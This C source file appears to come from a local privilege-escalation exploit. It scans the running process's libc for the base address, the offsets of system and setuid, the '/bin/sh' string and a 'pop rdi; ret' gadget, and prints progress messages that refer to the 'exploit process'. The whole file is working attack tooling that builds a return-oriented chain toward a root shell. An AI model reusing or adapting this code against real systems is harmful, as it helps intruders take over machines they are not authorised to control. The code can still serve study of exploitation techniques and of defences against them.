#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <link.h>
#include "auto_offsets.h"

static unsigned long g_libc_base = 0;
static const char* g_libc_path = NULL;
static unsigned long g_text_start = 0;
static unsigned long g_text_end = 0;

static int find_libc_info(struct dl_phdr_info *info, size_t size, void *data) {
    (void)size; (void)data;
    if (info->dlpi_name && strstr(info->dlpi_name, "libc.so")) {
        g_libc_base = info->dlpi_addr;
        g_libc_path = info->dlpi_name;
        for (int i = 0; i < info->dlpi_phnum; i++) {
            if (info->dlpi_phdr[i].p_flags & PF_X) {
                g_text_start = info->dlpi_addr + info->dlpi_phdr[i].p_vaddr;
                g_text_end   = g_text_start + info->dlpi_phdr[i].p_memsz;
                break;
            }
        }
    }
    return 0;
}

LibcOffsets get_auto_offsets(void) {
    LibcOffsets off = {0};

    dl_iterate_phdr(find_libc_info, NULL);
    if (!g_libc_base || !g_libc_path) {
        fprintf(stderr, "[-] Failed to locate libc in process!\n");
        exit(1);
    }
    printf("[*] Libc path: %s\n", g_libc_path);
    printf("[*] Libc base in exploit process: 0x%lx\n", g_libc_base);

    unsigned long scan = g_libc_base;
    unsigned long end  = g_text_end + 0x200000; /* грубо .rodata */
    off.offset_binsh = -1;
    for (unsigned long a = scan; a + 8 < end; a++) {
        if (memcmp((void*)a, "/bin/sh", 8) == 0) {
            off.offset_binsh = (long)(a - g_libc_base);
            break;
        }
    }

    /* Resolve system / setuid via dlsym Ч no hardcode */
    void *h = dlopen(g_libc_path, RTLD_LAZY | RTLD_NOLOAD);
    if (!h) h = dlopen(g_libc_path, RTLD_LAZY);
    if (!h) {
        fprintf(stderr, "[-] dlopen libc failed: %s\n", dlerror());
        exit(1);
    }

    void *p_system = dlsym(h, "system");
    void *p_setuid = dlsym(h, "setuid");
    if (!p_system || !p_setuid) {
        fprintf(stderr, "[-] dlsym failed: %s\n", dlerror());
        exit(1);
    }
    off.offset_system = (long)((unsigned long)p_system - g_libc_base);
    off.offset_setuid = (long)((unsigned long)p_setuid - g_libc_base);

    printf("[+] Offset system: 0x%lx\n", off.offset_system);
    printf("[+] Offset setuid: 0x%lx\n", off.offset_setuid);

    /* Find "/bin/sh" string in libc file */
    FILE *f = fopen(g_libc_path, "rb");
    if (!f) { perror("fopen libc"); exit(1); }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);
    char *buf = (char*)malloc(fsize);
    if (!buf) { perror("malloc"); exit(1); }
    if (fread(buf, 1, fsize, f) != (size_t)fsize) {
        fprintf(stderr, "[-] fread libc failed\n");
        exit(1);
    }
    fclose(f);

    off.offset_binsh = -1;
    for (long i = 0; i < fsize - 7; i++) {
        if (memcmp(&buf[i], "/bin/sh", 8) == 0) {
            off.offset_binsh = i;
            break;
        }
    }
    free(buf);
    if (off.offset_binsh < 0) {
        fprintf(stderr, "[-] /bin/sh not found in libc\n");
        exit(1);
    }
    printf("[+] Offset /bin/sh: 0x%lx\n", off.offset_binsh);

    /* Find pop rdi; ret (5f c3) in executable segment */
    off.offset_pop_rdi = -1;
    for (unsigned long addr = g_text_start; addr + 1 < g_text_end; addr++) {
        unsigned char *p = (unsigned char*)addr;
        if (p[0] == 0x5F && p[1] == 0xC3) {
            off.offset_pop_rdi = (long)(addr - g_libc_base);
            printf("[+] Found pop rdi; ret at 0x%lx (offset 0x%lx)\n",
                   addr, off.offset_pop_rdi);
            break;
        }
    }
    if (off.offset_pop_rdi < 0) {
        fprintf(stderr, "[-] pop rdi; ret not found!\n");
        exit(1);
    }

    /* ret for stack alignment = pop rdi; ret + 1 */
    off.offset_ret_align = off.offset_pop_rdi + 1;
    printf("[+] ret (align) offset: 0x%lx\n", off.offset_ret_align);

    off.page_size = 0x1000;
    return off;
}